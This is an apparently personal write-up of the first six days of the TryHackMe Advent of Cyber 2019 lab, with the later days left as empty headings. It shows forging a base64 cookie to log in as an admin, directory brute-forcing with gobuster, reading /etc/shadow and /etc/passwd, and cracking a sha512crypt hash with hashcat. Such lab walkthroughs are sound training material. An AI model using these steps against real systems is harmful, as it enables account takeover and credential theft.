# Advent of Cyber - Christmas 2019 Writeup

# Table of Contents
1. [Day 1 - Inventory Management](#day1)
2. [Day 2 - Artic Forum](#day2)
3. [Day 3 - Evil Elf](#day3)
4. [Day 4 - Training](#day4)
5. [Day 5 - Ho-Ho-Hosint](#day5)
6. [Day 6 - Data Elf-iltration](#day6)
7. [Day 7 - Skilling up](#day7)
8. [Day 8 - SUID Shenanigans](#day8)
9. [Day 9 - Requests](#day9)
10. [Day 10 - Metasploit-a-ho-ho-ho](#day10)
11. [Day 11 - Elf Applications](#day11)
12. [Day 12 - Elfcryption](#day12)
13. [Day 13 - Accumulate](#day13)
14. [Day 14 - Unknown Storage](#day14)
15. [Day 15 - LFI](#day15)
16. [Day 16 - File Confusion](#day16)
17. [Day 17 - Hydra-ha-ha-haa](#day17)
18. [Day 18 - ELF JS](#day18)
19. [Day 19 - Commands](#day19)
20. [Day 20 - Cronjob Privilege Escalation](#day20)
21. [Day 21 - Reverse Elf-ineering](#day21)
22. [Day 22 - If Santa, Then Christmas](#day22)
23. [Day 23 - LapLANd(SQL Injection)](#day23)
24. [Day 24 - Elf Stalk](#day24)

## Day 1 - Inventory Management <a name="day1"></a>

The first challenge is related to web hacking. In this task we will need to modify a cookie in order to access as the user mcinventory that has admin privileges.
Acording to the [suplemental material](https://docs.google.com/document/d/1PHs7uRS1whLY9tgxH1lj-bnEVWtXPXpo45zWUlbknpU/edit) cookies are generated every time an user perform an action, sent to the server and then checked if the user is authorized to do a certain action.

Attackers can take advantange of cookies when these have not enough randomness. Cookie fixation or predictable cookie values are the main causes of taking control of user accounts. The web application is available on the URL `http://<your-ip-address>:3000`, here you can see a login page that requires an user and password. Press **F12** in Firefox and then inspect in the Storage tab and you will see no cookie, this occurs because there is no user logged in yet. 
  
![](images/day1_1.png)

Let's create an account and login. In this example I have used the user **test** and now we can see a cookie value of `dGV*************IXNz` also we can see the **name**. The **name** is  the parameter required to **answer question 1** of Day 1 challenge. 

![](images/day1_2.png)  

In the file provided also says that normally cookies are base64 encoded. So, we can try to decode the cookie using the following command. A part of the decoded value is the **answer for question 2**

```
root@kali:/home/kali# echo "dGV*************IXNz" | base64 -d
root@kali:/home/kali# testv4******!ss
```

After decoding the flag we can notice a pattern looks like the form of `<user><fixed-value>` so let's see what would happen if we modify the user **test** to **mcinventory** that is the user that has admin privileges. As a result mcinventory<fixed-value>. However remember that we must base64 encode again to mimic the previous cookie. Once we have the new value, replace the previous cookie value with the new one. **Note:** The fixed part uses the special character `!` so to avoid issues in bash we need to escape this character with `\` before base64 encoding
  
```
root@kali:/home/kali# adminv4*******ss
root@kali:/home/kali# echo -n mcinventoryv4******\!ss | base64
root@kali:/home/kali# bWNpb*********************Fzcw==
```
The result of changing the cookie is a new page with /admin path with the user mcinventory. Here we can see the list of presents approved or rejected. The **answer of the question 3** is shown in the next image.

![](images/day1_3.png)

### 1. What is the name of the cookie used for authentication?

```
aut***
```

### 2. If you decode the cookie, what is the value of the fixed part of the cookie?**

```
v4*******ss
```

### 3. After accessing his account, what did the user mcinventory request?**

```
fi****ll
```

## Day 2 - Artic Forum <a name="day2"></a>

![](images/day2_1.png)

Day 2 of Christmas Challenge is about default credentials and bruteforcing web directories. In this forum we will use gobuster, a tool to test web pages status and bruteforce  based on dictionaries, here we will use dictionary `directory-list-2.3-medium.txt` 

```
root@kali:/home/kali# gobuster dir -u http://10.10.83.219:3000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.83.219:3000/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/13 11:34:36 Starting gobuster
===============================================================
/home (Status: 302)
/login (Status: 200)
/admin (Status: 302)
/Home (Status: 302)
/assets (Status: 301)
/css (Status: 301)
/Login (Status: 200)
/js (Status: 301)
/logout (Status: 302)
/sys***** (Status: 200)
```

The directory `/sys*****` is the answer for the first question. Now you need to write this path after the url `http://<your-ip-address>:3000` and as result an admin panel is shown. First step is to try some default users and passowrds like **user**, **root**, **toor** and others, we did not have success login with those credentials, sometimes developers leave some comments inside the source code, so you can try inspecting source code of this page and in the bottom you will see a comment related to a Github page. 

![](images/day2_2.png)

After searching for this repository in Google, one of the results was **Artic Digital Design** and also detailed some credentials for admin panel.

![](images/day2_3.png)

You can try to access with these credentials and yeah you got access. The forum uses **default credentials** to login. The **password** shown in the Github repository is the **answer to the second question.**

![](images/day2_4.png)

Inside the forum in the bottom page, you can see an entry with the **answer for the third question.**

### 1. What is the path of the hidden page?

```
/sys*****
```

### 2. What is the password you found?

```
de*******ss
```

### 3. What do you have to take to the 'partay'?

```
E****g
```

## Day 3 - Evil Elf <a name="day3"></a>

```
# sudo tshark -r 'Evil Elf.pcap' -Y "frame.number==998"
998   1.867761 10.10.186.136 → 63.**.**.195 TCP 74 39390 → 23 [SYN] Seq=0 Win=26883 Len=0 MSS=8961 SACK_PERM=1 TSval=2930534971 TSecr=0 WS=128
```

https://osqa-ask.wireshark.org/questions/14811/follow-tcp-stream-with-tshark-still-can-not-in-batch-mode


```
for stream in `tshark -r 'Evil Elf.pcap' -T fields -e tcp.stream -Y "frame.number==998" | sort -n -u`; do echo Stream: $stream; tshark -r 'Evil Elf.pcap' -q -z follow,tcp,ascii,$stream; done

Follow: tcp,ascii
Filter: tcp.stream eq 1
Node 0: 10.10.186.136:39390
Node 1: 63.32.89.195:23
32
echo '***' > christmas_list.txt

16
cat /etc/shadow

        956
root:*:18171:0:99999:7:::
daemon:*:18171:0:99999:7:::
bin:*:18171:0:99999:7:::
sys:*:18171:0:99999:7:::
sync:*:18171:0:99999:7:::
games:*:18171:0:99999:7:::
man:*:18171:0:99999:7:::
lp:*:18171:0:99999:7:::
mail:*:18171:0:99999:7:::
news:*:18171:0:99999:7:::
uucp:*:18171:0:99999:7:::
proxy:*:18171:0:99999:7:::
www-data:*:18171:0:99999:7:::
backup:*:18171:0:99999:7:::
list:*:18171:0:99999:7:::
irc:*:18171:0:99999:7:::
gnats:*:18171:0:99999:7:::
nobody:*:18171:0:99999:7:::
systemd-network:*:18171:0:99999:7:::
systemd-resolve:*:18171:0:99999:7:::
syslog:*:18171:0:99999:7:::
messagebus:*:18171:0:99999:7:::
_apt:*:18171:0:99999:7:::
lxd:*:18171:0:99999:7:::
uuidd:*:18171:0:99999:7:::
dnsmasq:*:18171:0:99999:7:::
landscape:*:18171:0:99999:7:::
sshd:*:18171:0:99999:7:::
pollinate:*:18171:0:99999:7:::
ubuntu:!:18232:0:99999:7:::
buddy:$6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1:18233:0:99999:7:::
```

https://hashcat.net/wiki/doku.php?id=example_hashes   encontramos el patron correspondiente a $6$ y este corresponde a sha512crypt en hashcat con la opcion -m 1800

```
# hashcat -m 1800 task3.txt /usr/share/wordlists/rockyou.txt --show
$6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1:r*****w
```



### 1. Whats the destination IP on packet number 998?

```
63.**.**.195
```

### 2. What item is on the Christmas list?

```
p**
```

### 3. Crack buddy's password!

```
r*****w
```

## Day 4 - Training <a name="day4"></a>

Ingresamos con las credenciales proporcionadas para ssh

```
[mcsysadmin@ip-10-10-110-7 ~]$ ls
f****  f****  f****  f****  f****  f****  f****  f****
```

```
[mcsysadmin@ip-10-10-110-7 ~]$ cat file5
r*****s
```

```
[mcsysadmin@ip-10-10-110-7 ~]$ grep -iRl 'password'
file*
```

```
[mcsysadmin@ip-10-10-185-184 ~]$ grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" file*
file2:10.*.*.**eXWx4auBc8Swra4aPvIoBre+PRsVgu9GVbGwD33X8bd7TWwlZxzSVYa
```

```
[mcsysadmin@ip-10-10-185-184 ~]$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
libstoragemgmt:x:999:997:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
ec2-instance-connect:x:998:996::/home/ec2-instance-connect:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:997:995::/var/lib/chrony:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
ec2-user:x:1000:1000:EC2 Default User:/home/ec2-user:/bin/bash
mcsysadmin:x:1001:1001::/home/mcsysadmin:/bin/bash
```

```
[mcsysadmin@ip-10-10-185-184 ~]$ sha1sum file8
fa67ee594***********************20fd2835  file8
```

```
[mcsysadmin@ip-10-10-184-144 /]$ find / -name *.bak 2>/dev/null
/etc/nsswitch.conf.bak
/var/shadow.bak
```

Here its a shadow.bak file.

```
[mcsysadmin@ip-10-10-184-144 var]$ cat shadow.bak 
root:*LOCK*:14600::::::
bin:*:17919:0:99999:7:::
daemon:*:17919:0:99999:7:::
adm:*:17919:0:99999:7:::
lp:*:17919:0:99999:7:::
sync:*:17919:0:99999:7:::
shutdown:*:17919:0:99999:7:::
halt:*:17919:0:99999:7:::
mail:*:17919:0:99999:7:::
operator:*:17919:0:99999:7:::
games:*:17919:0:99999:7:::
ftp:*:17919:0:99999:7:::
nobody:*:17919:0:99999:7:::
systemd-network:!!:18218::::::
dbus:!!:18218::::::
rpc:!!:18218:0:99999:7:::
libstoragemgmt:!!:18218::::::
sshd:!!:18218::::::
rpcuser:!!:18218::::::
nfsnobody:!!:18218::::::
ec2-instance-connect:!!:18218::::::
postfix:!!:18218::::::
chrony:!!:18218::::::
tcpdump:!!:18218::::::
ec2-user:!!:18234:0:99999:7:::
mcsysadmin:$6$jbosYsU/$qOYToX/**************************************************I6cQJLdFlS4gkBMzilDBYcQvu2ro/:18234:0:99999:7:::
```



### 1. How many visible files are there in the home directory(excluding ./ and ../)?

```
*                                             //this is a value between 0-9
```

### 2. What is the content of file5?

```
r*****s
```

### 3. Which file contains the string ‘password’?

```
f****
```

### 4. What is the IP address in a file in the home folder?

```
1*.*.*.**
```

### 5. How many users can log into the machine?

```
*                             //This is a number between 0-4
```

### 6. What is the sha1 hash of file8?

```
fa67ee****************************fd2835
```

### 7. What is mcsysadmin’s password hash?

```
$6$jbosYsU/$qOYToX/**************************************************I6cQJLdFlS4gkBMzilDBYcQvu2ro/
```


## Day 5 - Ho-Ho-Hosint <a name="day5"></a>

```
# exiftool thegrinch.jpg 
ExifTool Version Number         : 12.12
File Name                       : thegrinch.jpg
Directory                       : .
File Size                       : 69 KiB
File Modification Date/Time     : 2021:01:02 20:27:34-05:00
File Access Date/Time           : 2021:01:15 17:50:17-05:00
File Inode Change Date/Time     : 2021:01:15 17:49:44-05:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 10.10
Creator                         : JLolax1
Image Width                     : 642
Image Height                    : 429
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 642x429
Megapixels                      : 0.275
```

Here we can see the author JLolax1 that we can try to search in Google...

ww got a twitter account ...

![](images/day5_1.png)

![](images/day5_2.png)

In a tweet says...

![](images/day5_3.png)

![](images/day5_4.png)

![](images/day5_5.png)

![](images/day5_6.png)

### 1. What is Lola's date of birth? Format: Month Date, Year(e.g November 12, 2019)

```
December 29, 1900
```

### 2. What is Lola's current occupation?

```
Santa's Helper
```

### 3. What phone does Lola make?

```
iPhone X
```

### 4. What date did Lola first start her photography? Format: dd/mm/yyyy

```
23/10/2014
```

### 5. What famous woman does Lola have on her web page?

```
ada lovelace
```

## Day 6 - Data Elf-iltration <a name="day6"></a>

```
# tshark -r holidaythief.pcap -Y "dns"
```
Here we can see an extract using tshark and dns filter, we can see that the dns server `43616e64792043616e652053657269616c2
04e756d6265722038343931.holidaythief.com` is shown repeated times.

```
    9   1.762003 2604:6000:1103:4192:cc15:cc7f:2cd1:5fff → 2604:6000:1103:4192:6238:e0ff:fed7:8acb DNS 155 Standard query 0xaafe A 43616e64792043616e652053657269616c2
04e756d6265722038343931.holidaythief.com
   10   1.762445 2604:6000:1103:4192:cc15:cc7f:2cd1:5fff → 2604:6000:1103:4192:6238:e0ff:fed7:8acb DNS 155 Standard query 0x3b9a AAAA 43616e64792043616e65205365726961
6c204e756d6265722038343931.holidaythief.com
   11   1.794783 192.168.1.107 → 1.1.1.1      DNS 135 Standard query 0x3b9a AAAA 43616e64792043616e652053657269616c204e756d6265722038343931.holidaythief.com
   12   1.794784 192.168.1.107 → 1.1.1.1      DNS 135 Standard query 0xaafe A 43616e64792043616e652053657269616c204e756d6265722038343931.holidaythief.com
   13   1.828551 2604:6000:1103:4192:6238:e0ff:fed7:8acb → 2604:6000:1103:4192:cc15:cc7f:2cd1:5fff DNS 229 Standard query response 0x3b9a No such name AAAA 43616e6479
2043616e652053657269616c204e756d6265722038343931.holidaythief.com SOA dns1.registrar-servers.com,
   14   1.841119 2604:6000:1103:4192:6238:e0ff:fed7:8acb → 2604:6000:1103:4192:cc15:cc7f:2cd1:5fff DNS 229 Standard query response 0xaafe No such name A 43616e6479204
3616e652053657269616c204e756d6265722038343931.holidaythief.com SOA dns1.registrar-servers.com,
   15   1.859414 2604:6000:1103:4192:cc15:cc7f:2cd1:5fff → 2604:6000:1103:4192:6238:e0ff:fed7:8acb DNS 90 Standard query 0x52e3 A google.com
   16   1.859710 192.168.1.107 → 8.8.8.8      DNS 70 Standard query 0xa630 A google.com
   17   1.863443      1.1.1.1 → 192.168.1.107 DNS 209 Standard query response 0xaafe No such name A 43616e64792043616e652053657269616c204e756d6265722038343931.holiday
thief.com SOA dns1.registrar-servers.com, 
   18   1.870208      1.1.1.1 → 192.168.1.107 DNS 209 Standard query response 0x3b9a No such name AAAA 43616e64792043616e652053657269616c204e756d6265722038343931.holi
daythief.com SOA dns1.registrar-servers.com
```

The first part is hex encoded, so you can try to decrypt with python3 or any online tool.

```python
bytes.fromhex('43616e64792043616e652053657269616c204e756d6265722038343931').decode('utf-8')
'Candy Cane Serial Number 8491'
```

finding http files...

```
# tshark -r holidaythief.pcap -Y "http"
Running as user "root" and group "root". This could be dangerous.
   32   6.402494 192.168.1.107 → 192.168.1.105 HTTP 480 GET / HTTP/1.1 
   35   6.406185 192.168.1.105 → 192.168.1.107 HTTP 472 HTTP/1.0 200 OK  (text/html)
   45   8.568523 192.168.1.107 → 192.168.1.105 HTTP 533 GET /christmaslists.zip HTTP/1.1 
   48   8.572200 192.168.1.105 → 192.168.1.107 HTTP 1405 HTTP/1.0 200 OK  (application/zip)
  103  12.032858 192.168.1.107 → 192.168.1.105 HTTP 528 GET /TryHackMe.jpg HTTP/1.1 
  130  12.051620 192.168.1.105 → 192.168.1.107 HTTP 1455 HTTP/1.0 200 OK  (JPEG JFIF image)
```
We can export these files usign the following command.

```
# tshark -r holidaythief.pcap --export-object http,/home/kali/Documents/tryhackme/advent_of_cyber1/exported/
# ls
%2f  christmaslists.zip  TryHackMe.jpg
```

```
# steghide --extract -sf TryHackMe.jpg 
Enter passphrase: 
wrote extracted data to "christmasmonster.txt".
```


### 1. What data was exfiltrated via DNS?

```
Candy Cane Serial Number 8491
```

### 2. What did Little Timmy want to be for Christmas?

```
PenTester
```

## Day 7 - Skilling up <a name="day7"></a>

## Day 8 - SUID Shenanigans <a name="day8"></a>

## Day 9 - Requests <a name="day9"></a>

## Day 10 - Metasploit-a-ho-ho-ho <a name="day10"></a>

## Day 11 - Elf Applications <a name="day11"></a>

## Day 12 - Elfcryption <a name="day12"></a>

## Day 13 - Accumulate <a name="day13"></a>

## Day 14 - Unknown Storage <a name="day14"></a>

## Day 15 - LFI <a name="day15"></a>

## Day 16 - File Confusion <a name="day16"></a>

## Day 17 - Hydra-ha-ha-haa <a name="day17"></a>

## Day 18 - ELF JS <a name="day18"></a>

## Day 19 - Commands <a name="day19"></a>

## Day 20 - Cronjob Privilege Escalation <a name="day20"></a>

## Day 21 - Reverse Elf-ineering <a name="day21"></a> 

## Day 22 - If Santa, Then Christmas <a name="day22"></a>

## Day 23 - LapLANd(SQL Injection) <a name="day23"></a>

## Day 24 - Elf Stalk <a name="day24"></a>
